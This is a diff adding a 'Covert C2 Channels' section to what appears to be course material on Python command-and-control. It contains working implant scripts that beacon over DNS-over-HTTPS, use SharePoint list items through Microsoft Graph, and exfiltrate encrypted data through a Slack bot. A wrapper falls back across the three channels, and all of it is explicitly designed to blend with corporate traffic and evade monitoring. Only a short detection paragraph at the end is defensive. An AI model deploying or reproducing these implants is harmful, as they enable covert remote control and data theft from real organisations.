@@ -457,3 +457,220 @@ if __name__ == "__main__":
     # For TLS: ssl_context="adhoc" requires pip install pyopenssl
     app.run(host=args.host, port=args.port, debug=False)
 ```
+
+## Covert C2 Channels
+
+When port 443 is monitored or outbound TCP is filtered, fall back to channels that blend with legitimate corporate traffic. All three channels below share the same ChaCha20-Poly1305 encrypted message envelope and jitter timer.
+
+### Message Envelope (all channels)
+
+```
+{
+  "id":   "1fb6e9d8",      // 4-byte implant identifier (SHA-256 prefix)
+  "ts":   1717523267,      // unix epoch
+  "seq":  42,              // rolling counter — replay protection
+  "op":   "poll",          // poll | exfil | exec | ack
+  "body": "BASE64(ChaCha20-Poly1305(ciphertext))"
+}
+```
+
+**Why ChaCha20-Poly1305?** No AES hardware noise, 16-byte auth tag, and available in both the Python `cryptography` package and Go stdlib. Nonce = first 12 bytes of `HMAC-SHA256(id‖seq‖ts)` — unique per frame, no nonce reuse.
+
+### Channel 1 — DNS-over-HTTPS (DoH) Beacon
+
+Embeds the encrypted envelope as a base64url DNS query name. Uses Google/Cloudflare DoH endpoints — the request looks identical to legitimate HTTPS traffic to those IPs.
+
+```
+#!/usr/bin/env python3
+"""
+dns_beacon.py — C2 implant side: DNS-over-HTTPS beacon.
+Dependencies: pip install cryptography requests
+"""
+from __future__ import annotations
+import base64, hashlib, json, os, secrets, time
+import requests
+from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+
+# ─── CONFIG ────────────────────────────────────────────────────────────────
+C2_KEY  = bytes.fromhex("b6" * 32)       # replace with real 256-bit key
+DOH_URL = [
+    "https://dns.google/dns-query",
+    "https://cloudflare-dns.com/dns-query",
+]
+IMPLANT_ID = os.urandom(4).hex()          # 4-byte ID, stable per session
+# ───────────────────────────────────────────────────────────────────────────
+
+def nonce(id4: str, seq: int, ts: int) -> bytes:
+    raw = id4.encode() + seq.to_bytes(4, "big") + ts.to_bytes(4, "big")
+    return hashlib.sha256(raw).digest()[:12]
+
+def encrypt(op: str, payload: bytes = b"") -> str:
+    seq  = secrets.randbelow(2**32)
+    ts   = int(time.time())
+    aead = ChaCha20Poly1305(C2_KEY)
+    ct   = aead.encrypt(nonce(IMPLANT_ID, seq, ts), payload, None)
+    env  = {
+        "id": IMPLANT_ID, "ts": ts, "seq": seq, "op": op,
+        "body": base64.b64encode(ct).decode(),
+    }
+    return base64.urlsafe_b64encode(json.dumps(env).encode()).rstrip(b"=").decode()
+
+def beacon():
+    q   = encrypt("poll")
+    url = f"{secrets.choice(DOH_URL)}?dns={q}"
+    hdr = {"Accept": "application/dns-message",
+           "User-Agent": "Mozilla/5.0 (compatible)"}
+    r = requests.get(url, headers=hdr, timeout=10)
+    # Listener decodes the DNS answer TXT record for the tasking
+    print(f"[*] Beacon sent, status={r.status_code}")
+
+while True:
+    beacon()
+    time.sleep(30 + secrets.randbelow(30))   # 30–60 s jitter
+```
+
+### Channel 2 — Microsoft Graph API (O365)
+
+Reads/writes to SharePoint list items using a legitimate M365 OAuth app registration. Traffic is indistinguishable from normal Office 365 usage.
+
+```
+#!/usr/bin/env python3
+"""
+o365_beacon.py — C2 channel via Microsoft Graph SharePoint list items.
+Requires: Azure app registration with Sites.ReadWrite.All permission.
+Dependencies: pip install msal cryptography
+"""
+from __future__ import annotations
+import base64, hashlib, json, secrets, time
+import msal, requests
+from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+
+# ─── CONFIG ────────────────────────────────────────────────────────────────
+TENANT_ID   = "your-tenant-id"
+CLIENT_ID   = "your-app-client-id"
+CLIENT_SEC  = "your-app-client-secret"
+SITE_ID     = "your-sharepoint-site-id"
+LIST_ID     = "your-list-id"
+C2_KEY      = bytes.fromhex("b6" * 32)
+IMPLANT_ID  = secrets.token_hex(4)
+# ───────────────────────────────────────────────────────────────────────────
+
+def get_token() -> str:
+    app = msal.ConfidentialClientApplication(
+        CLIENT_ID, CLIENT_SEC,
+        authority=f"https://login.microsoftonline.com/{TENANT_ID}"
+    )
+    result = app.acquire_token_for_client(
+        scopes=["https://graph.microsoft.com/.default"]
+    )
+    return result["access_token"]
+
+def post_item(token: str, payload: dict):
+    """Write encrypted beacon as a SharePoint list item."""
+    url = (f"https://graph.microsoft.com/v1.0/sites/{SITE_ID}"
+           f"/lists/{LIST_ID}/items")
+    headers = {"Authorization": f"Bearer {token}",
+               "Content-Type": "application/json"}
+    body = {"fields": {"Title": IMPLANT_ID,
+                       "Body": json.dumps(payload)}}
+    requests.post(url, headers=headers, json=body, timeout=10)
+
+def get_tasks(token: str) -> list[dict]:
+    """Poll for tasking items addressed to this implant."""
+    url = (f"https://graph.microsoft.com/v1.0/sites/{SITE_ID}"
+           f"/lists/{LIST_ID}/items?$expand=fields"
+           f"&$filter=fields/Title eq 'task-{IMPLANT_ID}'")
+    headers = {"Authorization": f"Bearer {token}"}
+    r = requests.get(url, headers=headers, timeout=10)
+    return r.json().get("value", [])
+
+while True:
+    try:
+        tok = get_token()
+        post_item(tok, {"id": IMPLANT_ID, "op": "poll"})
+        tasks = get_tasks(tok)
+        for task in tasks:
+            print(f"[TASK] {task['fields'].get('Body')}")
+    except Exception as e:
+        print(f"[!] {e}")
+    time.sleep(60 + secrets.randbelow(60))
+```
+
+### Channel 3 — Slack Incoming Webhook
+
+Exfiltrates data as Slack messages using a workspace bot token. Blend-in: every corp Slack already has dozens of bots.
+
+```
+#!/usr/bin/env python3
+"""
+slack_beacon.py — C2 exfil via Slack API. Implant side.
+Dependencies: pip install slack-sdk cryptography
+"""
+from __future__ import annotations
+import base64, json, os, secrets, time
+from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305
+from slack_sdk import WebClient
+
+# ─── CONFIG ────────────────────────────────────────────────────────────────
+SLACK_TOKEN  = os.getenv("SLACK_BOT_TOKEN")   # xoxb-...
+CHANNEL      = "#general"                      # target channel or DM
+C2_KEY       = bytes.fromhex("b6" * 32)
+# ───────────────────────────────────────────────────────────────────────────
+
+client = WebClient(token=SLACK_TOKEN)
+
+def exfil(data: bytes):
+    aead = ChaCha20Poly1305(C2_KEY)
+    nonce = os.urandom(12)
+    ct    = aead.encrypt(nonce, data, None)
+    msg   = base64.b64encode(nonce + ct).decode()
+    # Split into 1500-char chunks to stay under Slack message limit
+    for i in range(0, len(msg), 1500):
+        client.chat_postMessage(channel=CHANNEL, text=msg[i:i+1500])
+    print(f"[+] Exfiltrated {len(data)} bytes via Slack")
+
+def poll_tasks() -> list[str]:
+    """Read recent messages from listener bot — parse commands."""
+    result = client.conversations_history(channel=CHANNEL, limit=5)
+    tasks  = []
+    for msg in result["messages"]:
+        if msg.get("text", "").startswith("CMD:"):
+            tasks.append(msg["text"][4:])
+    return tasks
+
+while True:
+    exfil(b"beacon poll")
+    for task in poll_tasks():
+        print(f"[TASK] {task}")
+    time.sleep(30 + secrets.randbelow(30))
+```
+
+### Degradation Strategy
+
+All three channels are wrapped in a single implant that tries each in order until one succeeds:
+
+```
+CHANNELS = [dns_beacon, o365_beacon, slack_beacon]
+
+def send_beacon():
+    for channel in CHANNELS:
+        try:
+            channel()
+            return    # success — stop trying
+        except Exception as e:
+            print(f"[-] Channel failed: {e}")
+    print("[!] All channels failed — sleeping 5m")
+    time.sleep(300)
+```
+
+**Detection signals:** DoH beaconing to `8.8.8.8:443` with fixed query patterns; SharePoint API calls from unusual user agents; Slack bots posting base64 blobs. Blue team: watch for encoded strings in Slack webhook traffic and anomalous Graph API application IDs.
+
+## Resources
+
+- Python C2 & Reverse Shells course module — AES/ChaCha20 channels, DoH/Graph/Slack beacons
+- `cryptography` Python library — `cryptography.io`
+- `paramiko` — SSH2 protocol implementation
+- `flask` — lightweight HTTP C2 listener framework
+- `msal` — Microsoft Authentication Library for Python
+- `slack-sdk` — official Slack Python SDK
+- ChaCha20-Poly1305 IETF RFC 8439
